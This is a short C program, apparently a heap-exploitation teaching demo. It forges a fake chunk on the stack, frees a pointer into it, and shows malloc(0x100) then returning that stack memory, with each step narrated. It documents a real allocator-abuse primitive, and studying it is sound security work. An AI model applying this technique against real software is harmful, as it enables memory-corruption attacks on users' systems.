#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    malloc(1);  // init heap

    fprintf(stderr, "We will overwrite a pointer to point to a fake 'smallbin' region.\n");
    unsigned long long *a, *b;
    unsigned long long fake_chunk[64] __attribute__ ((aligned (16)));

    fprintf(stderr, "The chunk:  %p\n", &fake_chunk[0]);

    fake_chunk[1] = 0x110;  // the size
    memset(fake_chunk+2, 0x41, sizeof(fake_chunk)-0x10);

    fprintf(stderr, "Overwritting our pointer with the address of the fake region inside the fake chunk, %p.\n", &fake_chunk[0]);
    a = &fake_chunk[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunk[0], &fake_chunk[2]);
    b = malloc(0x100);
    memset(fake_chunk+2, 0x42, sizeof(fake_chunk)-0x10);
    fprintf(stderr, "malloc(0x100): %p\n", b);
}
